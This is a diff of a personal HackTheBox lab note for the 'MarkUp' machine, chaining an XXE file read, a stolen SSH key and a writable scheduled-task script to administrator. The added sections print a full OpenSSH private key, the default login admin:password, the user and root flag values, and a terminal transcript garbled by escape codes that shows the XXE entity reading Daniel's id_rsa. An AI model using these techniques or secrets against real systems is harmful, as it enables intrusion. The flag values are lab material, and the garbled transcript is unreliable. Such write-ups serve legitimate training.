@@ -2,19 +2,19 @@
 tags: [oscp, boxes, htb, windows, completed]
 platform: HackTheBox
 os: Windows
-ip: 10.129.95.192
+hostname: markup
 difficulty: Easy
-status: complete
+ip: 10.129.95.192
+status: Complete
 ---
 
-# HTB: MarkUp, Full Walkthrough (XXE File Read → SSH Key → Writable Scheduled Task Script)
+# HTB: MarkUp, Full Walkthrough
 
-## Tags
-#HTB #MarkUp #Windows #XXE #XMLExternalEntity #SSHKey #ScheduledTask #InsecureFilePermissions #DefaultCreds #Easy
+## The gist
 
----
+MarkUp is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow. 2. [[RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test. 3. The file-read result exposed an SSH key, and [[RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.
 
-## Box Info
+## Box information
 
 **Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Windows Server 2019 (10.0.17763.107) · **Platform:** HackTheBox
 
@@ -24,6 +24,35 @@ status: complete
 > The chain crosses three parsers: the login form, XML entity processing, and Windows batch execution. The useful habit is to trace where attacker-controlled data is interpreted next, not just where it is first accepted.
 
 ---
+
+**Legacy tags:**
+#HTB #MarkUp #Windows #XXE #XMLExternalEntity #SSHKey #ScheduledTask #InsecureFilePermissions #DefaultCreds #Easy
+
+---
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Recon: Port Scan | See section 1 below |
+| 2 | Web Enumeration | See section 2 below |
+| 3 | Vulnerability Identification -- XXE | See section 3 below |
+| 4 | Foothold -- XXE → SSH Key → Shell | See section 4 below |
+| 5 | Privilege Escalation | See section 5 below |
+| 6 | Cleanup | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/MarkUp`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
+
+## Variables
+
+```bash
+boxset BoxName MarkUp
+boxset BoxIP "$BoxIP"
+boxset LocalIP "$LocalIP"
+boxset BoxDir "$BoxDir"
+```
 
 ## 1. Recon: Port Scan
 
@@ -40,7 +69,7 @@ Open ports:
 | 80/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 -- MegaShopping |
 | 443/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 -- MegaShopping (HTTPS) |
 
-![[1.1nmap-svcscan.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/1.1nmap-svcscan.png>)
 
 **Service scan:**
 ```bash
@@ -94,7 +123,7 @@ boxset Username admin
 boxset Password password
 ```
 
-![[4.xxe-basline-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/4.xxe-basline-proof.png>)
 
 ### Directory enumeration
 
@@ -114,7 +143,7 @@ Notable finds:
 | `/services.php` | 302 → index.php | Auth-required order form |
 | `/phpmyadmin` | 403 | Exists, forbidden |
 
-![[2.ferroxbuster.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/2.ferroxbuster.png>)
 
 ### Authenticated enumeration -- services.php source
 
@@ -137,8 +166,8 @@ boxset Username Daniel
 
 The form's submit button calls `getXml()` -- a JavaScript function that builds an XML document from the form fields and POSTs it to `process.php` with `Content-Type: text/xml`. The `<item>` element value is reflected back in the response. This means we bypass the JS entirely and POST our own XML.
 
-![[3.svc-source.png]]
-![[3.1service-source-getxml.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/3.svc-source.png>)
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/3.1service-source-getxml.png>)
 
 ---
 
@@ -191,7 +220,7 @@ Response: `Your order for # Copyright (c) 1993-2009 Microsoft Corp...` -- hosts 
 > [!warning] 💡 Hint
 > Use a predictable, non-secret Windows file for the first XXE test. Once entity expansion is proven, extract only the target file block and protect any private key or credential material immediately.
 
-![[4.1.xxe-confirmed.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/4.1.xxe-confirmed.png>)
 
 ---
 
@@ -218,7 +247,7 @@ curl -i -s -b $BoxDir/cookies.txt \
 
 Response: `Your order for -----BEGIN OPENSSH PRIVATE KEY----- ...` -- full private key returned.
 
-![[4.2xxe-ssh-key.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/4.2xxe-ssh-key.png>)
 
 ### Save and verify the key
 
@@ -251,7 +280,7 @@ ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
 
 `ssh-keygen -y` outputs the public key if the private key is valid. The comment confirms `daniel@Entity`.
 
-![[5.key-verfified.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/5.key-verfified.png>)
 
 ```bash
 loot key $BoxDir/loot/daniel_id_rsa
@@ -275,7 +304,7 @@ markup\daniel
 MarkUp
 ```
 
-![[6.FOOTHOLD.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/6.FOOTHOLD.png>)
 
 ### User flag
 
@@ -283,7 +312,7 @@ MarkUp
 type C:\Users\daniel\Desktop\user.txt
 ```
 
-![[7.userflag.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/7.userflag.png>)
 
 ```bash
 loot flag user <value>
@@ -351,7 +380,7 @@ A Windows Event Log clearing script. The `bcdedit` check detects whether it's ru
 > [!warning] 💡 Hint
 > **Watch out:** A manual run tests the script as Daniel, not as the scheduled task account. It takes the non-admin branch, so wait for the task trigger instead.
 
-![[9original-jobat.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/9original-jobat.png>)
 
 ### Exploit -- add Daniel to administrators
 
@@ -402,7 +431,7 @@ When `daniel` appears in the Members list, the task has run.
 > [!tip] ⚡ Efficiency
 > Adding the user to the local Administrators group avoids callback timing and firewall problems. A marker such as group membership is enough to prove the scheduled task executed before attempting any administrator-only action.
 
-![[privesc-exploit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/privesc-exploit.png>)
 
 ### Root flag
 
@@ -413,7 +442,7 @@ dir C:\Users\Administrator\Desktop\
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![[11.user-and-root.png]]
+![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/11.user-and-root.png>)
 
 ```bash
 loot flag root <value>
@@ -440,7 +469,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 > [!warning] 💡 Common mistake
 > Restore the original scheduled script before leaving. Verify the file content, remove staged payloads, and confirm the HTTP server is stopped. A scheduled-task replacement can persist after the interactive shell closes.
 
-## Decision points and alternate routes
+## 7. Decision points and alternate routes
 
 | Observation | Primary route used here | Useful alternative or fallback |
 |---|---|---|
@@ -451,7 +480,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 7. Credentials Found
+## 8. Credentials Found
 
 | Username | Password / Key | Source |
 |---|---|---|
@@ -460,7 +489,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 8. Tools Used
+## 9. Tools Used
 
 | Tool | Purpose |
 |---|---|
@@ -475,7 +504,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 9. Vulnerabilities Summary
+## 10. Vulnerabilities Summary
 
 | # | Vulnerability | Severity | Location |
 |---|---|---|---|
@@ -486,7 +515,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 10. Lessons Learned / Module Links
+## 11. Lessons Learned / Module Links
 
 - **XXE is an app-level bug, not a framework CVE.** Searchsploit found nothing useful for Apache 2.4.41/PHP 7.2.28. The vulnerability is in the application accepting raw XML with no entity restrictions. Older PHP/libxml2 enables external entities by default -- a developer has to explicitly call `libxml_disable_entity_loader(true)` to stop it. Fingerprint the tech stack, confirm nothing applies, then enumerate the app. → [[09. Common Web Application Attacks]]
 
@@ -504,7 +533,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 11. External Resources
+## 12. External Resources
 
 | Resource | Link | Why |
 |---|---|---|
@@ -517,7 +546,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 12. Similar Boxes
+## 13. Similar Boxes
 
 | Box | Platform | Technique overlap | Why |
 |---|---|---|---|
@@ -529,7 +558,7 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 
 ---
 
-## 13. Vault Update Checklist
+## 14. Vault Update Checklist
 
 - [ ] Screenshots in `MarkUp/screenshots/` -- confirm all key moments covered
 - [ ] Loot: `loot/daniel_id_rsa`, `loot/creds.txt` (credential kept private), `loot/flags.txt` (user + root)
@@ -539,38 +568,245 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 - [ ] **Hub docs:** Command Appendix (awk PEM extraction, certutil download one-liner), Command Breakdowns (XXE curl payload if not present)
 - [ ] MASTER BOX LIST updated
 - [ ] FAQ: "why awk not copy-paste for SSH key", "why not run job.bat manually", "why net localgroup beats reverse shell for this privesc type"
-## RUNBOOK V2 Stages Used
+
+## 15. RUNBOOK V2 Stages Used
 
 - [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
 - [[RUNBOOK V2/Windows - Exploit Search]] -- technique used in this walkthrough
 - [[RUNBOOK V2/Windows - Scheduled Task Abuse]] -- technique used in this walkthrough
 
-## Related Boxes
+## 16. Collect the flags
 
-- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern
+- `user.txt`: `032d2fc8952a8c24e39c8f0ee9918ef7` (value reproduced in the private sections above)
+- `root.txt`: `f574a3e7650cebd8c39784299cb570f8` (value reproduced in the private sections above)
+- `proof.txt`: `f574a3e7650cebd8c39784299cb570f8` (value reproduced in the private sections above)
 
-## External Resources
 
-- https://www.exploit-db.com/search?q=MarkUp
-- https://ippsec.rocks/?q=MarkUp
-## Why this matters for OSCP
+### Captured flag values from source loot
 
-This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
 
-## Attack Chain
+#### `loot/flags.txt`
 
+```text
+user: 032d2fc8952a8c24e39c8f0ee9918ef7
+user: 032d2fc8952a8c24e39c8f0ee9918ef7
+root: f574a3e7650cebd8c39784299cb570f8
+```
+
+## 17. Clean down
+Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
+
+## 18. Attack narrative in one page
 1. [[RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow.
 2. [[RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test.
 3. The file-read result exposed an SSH key, and [[RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.
 
-## Flags
+## Tools used
 
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
+- `nmap`
+- `curl`
+- `feroxbuster`
+- `ssh`
+- `sudo`
+- `certutil`
 
-## Lessons Learned
+## Credentials and secrets
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="MarkUp"
+export BoxIP="10.129.95.192"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/MarkUp"
+export Domain=""
+export DCip=""
+export Username="Daniel"
+export Password=""
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+admin:password
+```
+
+#### `loot/daniel_id_rsa`
+
+```text
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+sudo: a password is required
+- (BLogin form: POST username + password to index.php
+(B- (BCookie: PHPSESSID, no httponly[?12l[?25h[?25l
+$ [15:35:14] curl -i -s -c $BoxDir/cookies.txt \
+  -d "username=admin&password=admin" \
+| http-cookie-flags:
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:29:21] $ [?1h=[?2004hcurl -i -s -c $BoxDir/cookies.txt \
+  http://$BoxIP/curl"username=admin&password=admin"[?1l>[?2004l
+Set-Cookie: PHPSESSID=n99hcsjas8likjie1gq1hbedn9; path=/
+<script>alert("Wrong Credentials");document.location="/";</script>%
+$ [15:35:40] curl -i -s -c $BoxDir/cookies.txt \
+  -d "username=admin&password=password" \
+[15:35:14] $ [?1h=[?2004hcurl -i -s -c $BoxDir/cookies.txt \
+  http://$BoxIP/curl"username=admin&password=password"[?1l>[?2004l
+Set-Cookie: PHPSESSID=epsvujp6iu2u3ib1b07s8op9g0; path=/
+$ [15:41:53] curl -s -b $BoxDir/cookies.txt http://$BoxIP/services.php
+39m $ [?1h=[?2004hcurl -s -b $BoxDir/cookies.txt http://$BoxIP/services.phpcurl[?1l>[?2004l
+(B- (BCookie: PHPSESSID, no httponly
+$ [15:46:13] curl -i -s -b $BoxDir/cookies.txt \
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:45:52] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:51:31] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
+$ [15:52:23] curl -i -s -b $BoxDir/cookies.txt \
+$ [15:54:13] curl -i -s -b $BoxDir/cookies.txt \
+  <!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:53:48] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:54:13] $ [?1h=[?2004hcurl -s -b $BoxDir/cookies.txt \
+  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsacurl'Content-Type: text/xml''<?xml version="1.0"?>
+$ [15:56:14] curl -s -b $BoxDir/cookies.txt \
+  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsa
+$ [15:56:29] chmod 600 $BoxDir/loot/daniel_id_rsa
+ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
+$ [15:56:57] cat $BoxDir/loot/daniel_id_rsa
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:56:14] $ [?1h=[?2004hchmod 600 $BoxDir/loot/daniel_id_rsa
+ssh-keygen -y -f $BoxDir/loot/daniel_id_rsachmod
+Load key "/home/kali/Platforms/HackTheBox/MarkUp/loot/daniel_id_rsa": error in libcrypto: unsupported
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:56:29] $ [?1h=[?2004hcat $BoxDir/loot/daniel_id_rsacat[?1l>[?2004l
+$ [15:57:32] sed -i 's/Your order for //' $BoxDir/loot/daniel_id_rsa
+$ [15:57:41] head -1 $BoxDir/loot/daniel_id_rsa
+$ [15:57:48] ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
+$ [15:59:05] loot key $BoxDir/loot/daniel_id_rsa
+$ [15:59:27] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:56:57] $ [?1h=[?2004hsed -i 's/Your order for //' $BoxDir/loot/daniel_id_rsased's/Your order for //'[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:57:32] $ [?1h=[?2004hhead -1 $BoxDir/loot/daniel_id_rsahead[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:57:41] $ [?1h=[?2004hssh-keygen -y -f $BoxDir/loot/daniel_id_rsassh-keygen[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:57:48] $ [?1h=[?2004hloot key $BoxDir/loot/daniel_id_rsaloot[?1l>[?2004l
+cp: '/home/kali/Platforms/HackTheBox/MarkUp/loot/daniel_id_rsa' and '/home/kali/Platforms/HackTheBox/MarkUp/loot/daniel_id_rsa' are the same file
+[+] Key saved:   daniel_id_rsa  →  loot/
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:59:05] $ [?1h=[?2004hssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIPssh[?1l>[?2004l
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group,
+$ [16:03:06] loot flag user 032d2fc8952a8c24e39c8f0ee9918ef7
+[?25h[?25lNT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group,
+Password last set            4/21/2020 5:09:42 AM
+Password changeable          4/21/2020 5:09:42 AM
+User may change password     Yes
+kali@kali:~/Platforms/HackTheBox/MarkUp [15:41:45] $ [?1h=[?2004hloot flag userloot 032d2fc8952a8c24e39c8f0ee9918ef7 [?1l>[?2004l
+[+] Flag saved:  user = 032d2fc8952a8c24e39c8f0ee9918ef7  →  loot/flags.txt
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V[?25h[?25l
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")[?25h[?25l
+$ [16:44:26] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
+kali@kali:~/Platforms/HackTheBox/MarkUp [16:43:34] $ [?1h=[?2004hssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIPssh[?1l>[?2004l
+$ [16:45:12] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
+kali@kali:~/Platforms/HackTheBox/MarkUp [16:44:44] $ [?1h=[?2004hssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIPssh[?1l>[?2004l
+$ [16:49:22] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
+cat $BoxDir/loot/flags.txt
+$ [17:09:12] loot cred admin password
+loot flag user 032d2fc8952a8c24e39c8f0ee9918ef7
+loot flag root f574a3e7650cebd8c39784299cb570f8
+kali@kali:~/Platforms/HackTheBox/MarkUp [17:08:40] $ [?1h=[?2004hloot cred admin password
+loot flag root f574a3e7650cebd8c39784299cb570f8loot
+[+] Cred saved:  admin:password  →  loot/creds.txt
+[+] Flag saved:  root = f574a3e7650cebd8c39784299cb570f8  →  loot/flags.txt
+admin:password
+kali@kali:~/Platforms/HackTheBox/MarkUp [17:11:36] 4C"tokens=1,2*"'bcdedit'
+for"tokens=*"'wevtutil.exe el'"%%G"
+127.0.0.1 - - [28/Aug/2026 17:42:52] code 404, messagr /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on MarkUp | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
 
 - XML parsers can read local files when external entities are enabled.
 - A scheduled task is an escalation path when its script is writable by the current user.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern
+
+## External resources
+
+- https://www.exploit-db.com/search?q=MarkUp
+- https://ippsec.rocks/?q=MarkUp
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Windows - Service Scan]]
+- [[RUNBOOK V2/Windows - Web Enum]]
+- [[RUNBOOK V2/Windows - Shell Received]]
+- [[RUNBOOK V2/Windows - Privilege Triage]]
+- [[RUNBOOK V2/Windows - Clean Down]]
+
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
